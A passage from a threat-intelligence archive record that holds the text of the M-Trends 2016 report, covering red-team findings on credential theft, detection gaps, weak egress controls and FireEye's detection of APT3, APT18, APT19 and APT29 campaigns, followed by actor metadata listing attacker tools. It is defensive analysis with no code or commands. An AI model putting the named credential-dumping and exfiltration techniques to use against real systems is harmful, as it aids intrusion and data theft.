and\nsteal critical data. All vectors,\nincluding social engineering,\nphysical breaches, and even\nattacks against the parent and\nsibling organizations, were\nin scope. Except for the CIO,\nthe target organization had\nno knowledge of the event,\nand all testing was to be\n\n\n###### Vulnerability assessments help organizations identify known issues in their environments.\n\nExample: An insider threat\nassessment of a biomedical\ncompany in which Mandiant was\nprovided intranet access and\ngiven the objectives of gaining\naccess to executive email,\nresearch data, and PHI.\n\n###### Penetration tests add a human element.\n\nconducted from non-attributable\ninfrastructure. Mandiant was\nalso instructed to leave flags on\ncompromised systems to gauge\nthe effectiveness of response\nteams at detecting, tracking, and\ninvestigating the attack.\n\n###### Red team engagements can fully mimic advanced attackers, identify unknown vulnerabilities and help train your security staff in a controlled attack simulation\n\n\n-----\n\nIt is important to note that each of the three\ncategories defined above add substantial value\nand are important to an effective security\nprogram. Many of the same tools and techniques\nused in a Red Team operation are also used\nduring vulnerability assessments and penetration\ntests. Each type of testing produces relevant and\nactionable findings that can be used to reduce risk\nfrom cyber threats.\n\nThe key differentiator between Red Team\noperations and the other two categories of\nassessments is that Red Team operations provide\na unique perspective into organizational readiness\nand attack resiliency. In addition to identifying\ncritical security gaps at each layer of the security\nmodel, the Red Team also helps companies\nenhance their detection and response capabilities\n(i.e. defending their environment) by subjecting\ntheir security program to a realistic attack\nscenario that is believable and relevant.\n\n\nIn his excellent presentation at USENIX Enigma\n2016[5], Rob Joyce, NSA TAO Chief, made the\nfollowing statement in the context of how\nthe NSA performs reconnaissance against\ntarget networks: “You (the defender) know the\ntechnologies that you intended to use in that\nnetwork. We (the attacker) know the technologies\nthat are actually in use in that network.” He\nemphasizes knowing your environment, and\ngoes on to highlight the importance of using Red\nTeams as a way to gain an understanding of your\norganization’s threat surface, and the value of\nassessing the environment from the perspective\nof an adversary. The necessity of this targeted\ntesting is being realized by many organizations\nand increasingly used to supplement traditional\nvulnerability assessments and penetration tests.\n\n\n###### The Red Team also helps companies become better at defending by subjecting their security program to a realistic attack scenario that is believable and relevant\n\n5 USENIX Enigma 2016 - NSA TAO Chief on Disrupting Nation State Hackers - https://youtu.be/bDJb8WOJYdA\n\n\n-----\n\n2015 security failure trends\n\n###### The following observations are not intended to be an exhaustive compilation or “Top X” listing of the security vulnerabilities that continue to plague enterprises. As with every security firm and internal testing team, we continue to encounter default credentials, missing patches, poor input validation, outdated operating systems and other common issues showing up on vulnerability reports everywhere.\n\nRather, these observations represent a common set of key issues identified during targeted\ntesting in which the target organization is unaware of the test (except for a small set of\nstakeholders), and our testers have “carte blanche” to attack the organization using the same\nTTPs of an advanced adversary.\n\n\nObservation #1 – Credentials, in general\nCaptured credentials remain the most efficient\nand undetected technique for compromising\nan enterprise. Most notable are the following:\n\n- Many organizations still have not fixed\nthe password problem. In short, many\norganizations still struggle with forcing\nusers to use passwords that are sufficiently\ncomplex and difficult to guess. There is\nplenty of research and statistics available\non passwords[6], and the issues specific to\nuser password management have been\nacknowledged for a very long time. Modern\nenterprises have access to a variety of\nrobust solutions that address the problem\nwith credentials, from password vaults\nto multi-factor authentication to single\nsign on. Yet passwords remain a systemic\nproblem for almost every client we\nencounter, so we cannot discuss attacking\nwithout talking about passwords.\n\nThis issue is not just limited to the regular\nuser population. Sysadmins, developers,\nDBAs, domain administrators, and even\nsecurity professionals continue to present\na huge risk to their own enterprises. These\nusers – who should know better and are\nhighly targeted – remain some of the worst\noffenders for choosing poor passwords or\ndisregarding established policy.\n\nIf you are on an IT or security team, know\nthis: The bad guys are coming for you and\nthey want your credentials. Do not make it\neasy by having a poor password policy.\n\n\n\n- Cached credentials remain a major issue.\nIn addition to the well-known password\ndumping tools already available, the\nweaponization of PowerShell and WMI\nhas resulted in multiple effective toolkits\nthat make targeting “high value” users\nand extracting credentials from memory\nalmost trivial. These tools are fast, almost\nimpossible to detect by AV, publiclyavailable, and widely supported. Even with\ndetailed guidance from Microsoft regarding\nthe protection of credentials[7] and the\nbuilt-in safeguards in modern Windows\noperating systems, our Red Teams\ncontinue to have extraordinary success\nretrieving credentials from memory and\nreusing those credentials to move laterally\nthroughout a network.\n\n- Single factor authentication. This\narchitectural flaw has been discussed\nand addressed for a long time, yet we\ncontinue to see organizations expose\nOWA, Citrix, SAP, and even VPN to\nthe Internet behind single factor (and\noften Active Directory-integrated) login\npages. It is trivial to create a social\nengineering campaign that tricks users into\n“authenticating” with their AD credentials\nto a malicious site. Furthermore, it provides\nan attacker already within the environment\nan alternative path that is virtually\nindiscernible from normal user activity.\n\n\n6  Example: https://blog.netspi.com/netspis-top-password-masks-for-2015/\n\n7 Credentials Protection and Management - https://technet.microsoft.com/en-us/library/dn408190.aspx\n\n\n-----\n\nObservation #2 – Inability to detect targeted\nattacks or differentiate commodity activity\nfrom legitimate threat actors\nDuring targeted engagements where the\norganization was unaware of the test (we refer\nto this as “Zero Knowledge”), we observed\nthat security and operations teams continue\nto miss important indicators of an attack in\nprogress. From our experience, the root cause\nlies equally across people, processes, and\ntechnology. In short, most organizations are\nnot adequately staffing, equipping, training,\nand exercising their detection teams. This\nleaves defenders unprepared for actual\nattacks, and attackers with far too much time\nto operate unobserved.\n\nExamples include the following:\n\n- Although many endpoint security\nproducts have some ability to detect\ncommon attack tools (e.g., web shells,\npassword dumping tools, RATs), alerts\ngenerated during testing are often\nignored or incorrectly prioritized. In tests\nwhere we intentionally generated an AV\nalert associated with credential dumping\nmalware (e.g., Mimikatz), less than 10\npercent of organizations recognized the\nalert as an indication of ongoing threat\nactivity and responded appropriately. In\nmost cases, the security team was content\nto let AV quarantine the malware and\nperformed no additional investigation.\n\n- Similarly, perimeter monitoring continues\nto fail at differentiating ongoing\nreconnaissance and exploitation from\ntypical alert background noise. While\nport scanners, brute force tools, and\nother “loud” techniques are often\nobserved, manual attacks – particularly\nagainst web applications – continue to\ngo largely undetected. In almost every\ntest conducted by Mandiant in 2015,\norganizations that had no prior knowledge\nof the test were unable to detect the\nattacks against their perimeter, even\nwhen those attacks resulted in successful\ncompromise and a full perimeter breach.\n\n\n\n- Indicators on critical internal systems,\nincluding security controls, are being\nignored. In 2015, Mandiant encountered\nmultiple organizations that deployed\nbest-practice security controls,\nincluding password vaults, two-factor\nauthentication, data encryption, and\nSIEM – but are not monitoring access\nattempts or administrative activity on\nthese controls! Given the high level of\nprivileges under which these controls\nexecute and their importance to the\nsecurity posture of the organization,\nthey make a particularly interesting\ntarget. Our Red Team regularly leverages\ncompromised security infrastructure to\nperform reconnaissance, gain additional\naccess, and even observe the security\nteam’s activities. By not monitoring access\nattempts and administrative activity on\nthese security controls, organizations\nmiss out on key indicators that a targeted\nattack is in progress.\n\nThis lack of awareness is not limited to just\nsecurity controls. Many organizations are\nnot monitoring access attempts against\ncritical internal business resources. In\none Red Team engagement against a\nparticularly well-secured organization,\nMandiant successfully compromised\nthe enterprise intranet portal and used\nthe portal to host malware for social\nengineering attacks against other more\nsecure business units. The process of\nfinding and exploiting vulnerabilities\non the portal environment took several\ndays. Furthermore, once the foothold\nwas obtained via a web shell, Mandiant\nattempted unsuccessfully to obtain\nelevated privileges on the server. These\nexploitation attempts generated multiple\nlog entries and even AV alerts, all of\nwhich were unnoticed or not acted upon.\nIn Mandiant’s experience conducting\ntargeted penetration tests and Red Team\nengagements, this lack of attention to\ninternal security alerts was commonplace.\n\n\n-----\n\nObservation #3 – Poor egress controls\nAlmost every organization has invested time\nand money on hardening the perimeter to\nreduce inbound attacks; however, limiting\negress traffic seems to remain a lower priority\nthan many other security initiatives. By not\nprioritizing egress controls, environments\nallow malware, malicious internal users and\nattackers the ability to easily establish remote\nconnections with untrusted Internet hosts,\nenabling command and control and data theft.\n\n- Not using the egress controls already\nin place: While companies are investing\nin new tools for endpoint security (DLP,\nemail protection, network monitoring,\netc.), we continue to observe that many\nare ignoring capabilities that already\nexist in their network infrastructure and\nperimeter controls to block unnecessary\negress traffic. It is not unusual to find\nunfiltered outbound connectivity to\nuntrusted external hosts via protocols\nsuch as SSH, RDP, and DNS. While we\nacknowledge the organizational pain of\nshutting off legacy egress connectivity,\ncompared to deploying new technology,\nwriting firewall rules is comparatively\ncheap.\n\n- Inability to detect malicious egress\ntraffic and data theft. Almost every Red\nTeam engagement includes attempts\nto establish outbound connections with\nuntrusted external systems, usually for the\npurposes of faux data exfiltration. Only\nin very few instances were the internal\nsecurity teams able to detect outbound\ncommand and control or data theft\nactivities by our Red Team. Even when\noutbound connections are blocked by\negress rules or web content filters, there is\noften no associated alert or that alert gets\nignored. This gives the attacker time to\nfind alternate paths out of the network.\n\n\nUse case: Mandiant performed a Red Team\noperation against a client that claimed to\nhave strong DLP. One of the key objectives\nof the engagement was to see if their internal\nsecurity team could detect data theft. We\ntested this by first connecting to a primary\ndomain controller, where we discovered that\nthe server could communicate directly with\nthe Internet. Then, from the domain controller,\nwe then transferred a large set of Social\nSecurity numbers using unencrypted HTTP to\nan untrusted external website.\n\nUpon receiving the results, the client was\nskeptical that Social Security numbers without\nassociated personal information would not be\nsufficient to trigger the DLP, so the dataset\nwas expanded to include name, address, Social\nSecurity number, phone number, and credit\ncard. Using the same transfer process, this\nexpanded dataset was extracted from the\nenvironment completely undetected.\n\nWhile we do not know why the DLP failed\nto detect the unencrypted outbound data\ntransfer of sensitive information in this\ninstance, in our experience this result is not\natypical and emphasizes the importance of\nassessing security controls against realistic\nattack activity.\n\n\n-----\n\nConclusion\n\nOur intent is not to beat up on security\norganizations and IT teams that are\noverwhelmed by the burden of maintaining\nand securing an enterprise, often with limited\nstaff, time, and money. We understand that\nmanaging a comprehensive security program is\ndifficult, and we acknowledge that fixing known\nvulnerabilities can take a long time and a lot of\nmoney. Additionally, many companies are just\nnot able to invest as necessary to effectively\ndetect and respond to targeted attacks.\n\nFor organizations that can acknowledge that\nthere are significant gaps in their security\nprogram, we do not always recommend\nfull-scale Red Team operations. Emphasis\nshould first be placed on maturing the security\nprogram, educating users, and securing critical\ninfrastructure and assets. There is no point in\nassessing the security of something known to\nbe insecure in your environment. For clients\nthat aren’t ready to test themselves against\na real-world adversary, more tightly scoped\nvulnerability assessments and penetration\ntests against key systems and applications\nmay provide more value.\n\n\nHowever, we continue to see an increased\ndemand for targeted assessments that\nemulate advanced attackers, particularly\namong organizations with mature security\nprograms that view security as a constantly\nevolving process that must be re-evaluated\non an ongoing basis. These companies are\nsupplementing the vulnerability management\nprogram with annual or semi-annual targeted\nRed Team assessments to challenge their\nsecurity controls and exercise their detection\nand response capabilities. By putting the\nenterprise up against a realistic attack, these\ncompanies can go beyond the question\nof “Am I secure?” and start answering the\nquestion “Am I prepared?”\n\n\n-----\n\n## FaaS\n\n###### REAL-TIME ADVERSARY DETECTION AND RESPONSE AT SCALE\n\n\n-----\n\nFireEye as a Service (FaaS) provides detection services\nacross 4 million hosts at more than 200 clients, and routinely\ndeals with dozens of active events at any given moment. Days 0-11:\nOur primary focus is the high-end APT and criminal threats. APT3 Use of 0-Day\nThis task is often complicated by a combination of multiple\nadvanced groups active against clients at any given time,\nalong with the presence of commodity issues.\n\nDays 9-14:\n\nThreat detection on a single host or even one client APT19 Compromise\nenvironment is historically difficult, but conducting these\nactivities at speed and scale provides an entirely different\nchallenge. FaaS utilizes a combination of advanced\n\nDays 17-27:\n\nintelligence, layered technology, and six Advanced Detection\n\nAPT3 and APT18 Use of\n\nCenters to ensure client detection in an around the clock and\n\n“Hacking Team” 0-Day\n\nevery day of the year model – all at speed and scale.\n\nFor example, in a single 30-day period FaaS identified two\ndistinct zero-day campaigns by multiple hackers supporting Days 19-30:\nthe Chinese government, an intrusion into a law firm by APT29 Compromise\nRussian hackers with suspected state ties, and a separate\nChina-based intrusion into a manufacturer in the course of\nour routine efforts.\n\nDays 0-30:\nFaaS conducted 11 surge\n\nIn June 2015, FaaS identified malicious spear phishing from\n\nevents, produced 325\n\nAPT3 against several clients. FireEye Threat Intelligence\n\nalerts to clients, 169 of\n\nassesses APT3 is a highly proficient group of Chinese which were APT events\nhackers who work on behalf of the Chinese government.\nWithin 24 hours, the combined FireEye enterprise\ndetermined the emails contained a zero-day exploit for\nAdobe Flash. Over the course of three weeks, APT3 targeted\n14 FaaS clients with this zero-day and a range of other\nmalware tools.\n\nWith the FaaS follow-the-sun detection capability, we were\nable to stay ahead of APT3 throughout this campaign, work\nwith Adobe to develop a patch, provide information to other\nsecurity vendors, and proactively provide all FaaS clients\nwith campaign updates. Through our work with the FireEye\nThreat Intelligence team, FaaS identified 20 additional clients\npreviously targeted by APT3, began proactive advanced\ndetection for these 20 clients, and released APT3 indicators\nto all FaaS clients. Five of these 20 clients were targeted in\nthe following weeks, with the advanced notifications and\nactions preventing any APT3 success. FireEye has labeled\nthis event Operation Clandestine Wolf.[8]\n\n8 Erica Eng and Dan Caselden, “Operation Clandestine Wolf—Adobe Flash Zero-Day in APT3 Phishing Campaign”,\n\n23 June 2015, FireEye, https://www.fireeye.com/blog/threat-research/2015/06/operation-clandestine-wolf-ado­\nbe-flash-zero-day.html\n\n\n-----\n\n**23:59**\n\nMaking the\nHand-Off\n\n\n**16:13**\n\nDiscovery of\nthe Backdoor\n\n\n**20:54** **16:37**\n\n\nIdentifying the\nInitial Attack\nVector\n\n\nReporting the\nCompromise and\nRecommendations\n\n\n**18:02**\n\nWatching and Learning\n\n|g the Off FIR 24 H fying the Attack r|ST OURS|\n|---|---|\n\n\nWithin a week of Clandestine Wolf, FaaS observed APT3\nand another China-based attack group known as APT18\nleverage a second Adobe Flash zero-day exploit against 18\nFaaS clients. APT3 and APT18 both discovered this zeroday vulnerability after unnamed hackers compromised an\nItalian intrusion software company known as The Hacking\nTeam and leaked their exploits online.[9]\n\nSimilar to the Operation Clandestine Wolf case, FaaS\nalerted on this activity immediately due to existing\ndetections for these groups, despite the use of a separate\nzero-day exploit. After immediate response from the\ntargets, FaaS alerted all of our clients within 24 hours of\nthe first attempts and passed indicators for use at their\ndiscretion. This, in turn, prevented at least two separate\nintrusions over the coming week when APT3 and APT18\nexpanded their target sets.\n\nDuring the widespread zero-day exploit use by APT3 and\nAPT18, two other significant intrusions occurred. The first\ninvolved APT29 – a suspected Russian origin threat group\n– compromising an entity actively involved in Russian\noil interests. APT29 conducted numerous RDP sessions\ndisguised as valid normal SSL connections inside this\nclient. The RDP sessions were used to place malicious code\nwithin the firm, as well as steal multiple files.\n\n\nThe second significant intrusion occurred against a\nmanufacturer by APT19, a suspected Chinese origin\ngroup. APT19 initially used a backdoor to spread across\nthe environment and then harvested almost 6,000 valid\nuser accounts. Once they leveraged the accounts to gain\nlegitimate access, APT19 deleted tools and evidence of\ntheir initial access in a significant counter-forensic effort.\nFaaS quickly responded to this event using well-vetted\nknowledge of legitimate access detection methodologies\nand intelligence on APT19 from the FireEye Threat\nIntelligence team.\n\nFaaS expects adversary detection and response to\ncontinue growing in complexity and volume for the\nforeseeable future. We see more activity from known\nactors as well as an ever-increasing range of new threats\neach year. Additionally, clients field expanding types of\ntechnology in an increasing global footprint. This in turn\nrequires a wider range of detection technology for an\neffective security posture. FaaS believes tight integration\nwith Mandiant’s incident response efforts and a unified\nFireEye platform will allow for an effective response\ncapability for our clients in this constantly shifting\noperational environment.\n\n\n9 Steve Ragan, “Hacking Team Hacked, Attackers Claim 400GB in Dumped Data”, 05 July 2015, CSO, http://www.csoonline.com/article/2943968/\n\ndata-breach/hacking-team-hacked-attackers-claim-400gb-in-dumped-data.html\n\n\n-----\n\n## CONCLUSION\n\n\nYear after year attackers implement new\nand interesting techniques to conduct their\nmalicious operations, and security teams get\nsmarter and better equipped to combat those\ntechniques. In addition, the technology we rely\non changes at a rapid pace, requiring us to\nfigure out how to secure that new technology\nwhere there may be no precedent for security.\n\nThis “cat and mouse” game is what makes\nour industry so unique and challenging;\n“good enough” is just never good enough.\nEven though the median number of days\ncompromised has been steadily declining\nover the last five years from when we\nstarted keeping such statistics, 146 days is\nstill too long, as the section on Red Teaming\ndemonstrates.\n\nBreached organizations now have to worry\nabout so many factors other than questions\nabout what data was stolen, how the attacker\nbroke in, and how to remediate the situation.\n\n\nVictim organizations now face public\nscrutiny, government inquiries, and lawsuits\nas never before. Breaches have also started\naffecting average, everyday people, turning\nthe conversation from a strictly securityfocused conversation to one that non-security\npersonnel can comprehend.\n\nWe have to constantly evolve our security\nprograms to keep up with the ever-changing\nthreat landscape. This means treating our\nsecurity programs as an evolving process\nand implementing safeguards — not just\nbest practices — to protect against attacker\nactivity. Part of that evolving process should\ninclude partnering with organizations that\nspecialize in defending against the threats\nspecific to your business.\n\n\n-----\n\n###### For more information on Mandiant, visit:\n www.fireeye.com/services.html \n\n**FireEye, Inc.**\n1440 McCarthy Blvd. Milpitas, CA 95035\n408.321.6300 / 877.FIREEYE (347.3393) / info@fireeye.com\n\n**[fireeye.com](https://www.fireeye.com)**\n\n© 2016 FireEye, Inc. All rights reserved. FireEye is a registered trademark of\nFireEye, Inc. All other brands, products, or service names are or may be trade­\nmarks or service marks of their respective owners. SP.MTRENDS.EN-US.022016\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf"
    ],
    "report_names": [
        "rpt-mtrends-2016.pdf"
    ],
    "threat_actors": [
        {
            "id": "1f3cf3d1-4764-4158-a216-dd6352e671bb",
            "created_at": "2022-10-25T15:50:23.837615Z",
            "updated_at": "2025-03-27T02:00:55.556414Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "APT19",
                "Codoso",
                "C0d0so0",
                "Codoso Team",
                "Sunshop Group"
            ],
            "source_name": "MITRE:APT19",
            "tools": [
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c8aefee7-fb57-409b-857e-23e986cb4a56",
            "created_at": "2023-01-06T13:46:38.285223Z",
            "updated_at": "2025-03-27T02:00:02.79333Z",
            "deleted_at": null,
            "main_name": "APT18",
            "aliases": [
                "TG-0416",
                "SCANDIUM",
                "PLA Navy",
                "Wekby",
                "G0026",
                "DYNAMITE PANDA"
            ],
            "source_name": "MISPGALAXY:APT18",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "61c4ddc4-156b-4828-8570-0979da81f3d0",
            "created_at": "2022-10-25T16:47:55.593828Z",
            "updated_at": "2025-03-27T02:05:17.275161Z",
            "deleted_at": null,
            "main_name": "BRONZE MAYFAIR",
            "aliases": [
                "Gothic Panda ",
                "TG-0110 ",
                "APT3 "
            ],
            "source_name": "Secureworks:BRONZE MAYFAIR",
            "tools": [
                " HUC Proxy Malware (Htran)",
                " Pirpi",
                " SplitVPN",
                " ctt",
                " ctx",
                "Cookiecutter"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2669aa86-663f-4e72-9362-9e61ff3599f4",
            "created_at": "2022-10-25T15:50:23.344796Z",
            "updated_at": "2025-03-27T02:00:55.448539Z",
            "deleted_at": null,
            "main_name": "APT18",
            "aliases": [
                "APT18",
                "TG-0416",
                "Dynamite Panda",
                "Threat Group-0416"
            ],
            "source_name": "MITRE:APT18",
            "tools": [
                "hcdLoader",
                "gh0st RAT",
                "cmd",
                "Pisloader",
                "HTTPBrowser"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "13354d3f-3f40-44ec-b42a-3cda18809005",
            "created_at": "2022-10-25T15:50:23.275272Z",
            "updated_at": "2025-03-27T02:00:55.418075Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "APT3",
                "Gothic Panda",
                "Pirpi",
                "UPS Team",
                "Buckeye",
                "Threat Group-0110",
                "TG-0110"
            ],
            "source_name": "MITRE:APT3",
            "tools": [
                "OSInfo",
                "schtasks",
                "PlugX",
                "LaZagne",
                "SHOTPUT",
                "RemoteCMD"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1456388065,
    "ts_modification_date": 1456388429,
    "files": {
        "pdf": "https://archive.orkl.eu/06224e369906b48f6a86fe582304ef2df3d4436c.pdf",
        "text": "https://archive.orkl.eu/06224e369906b48f6a86fe582304ef2df3d4436c.txt",
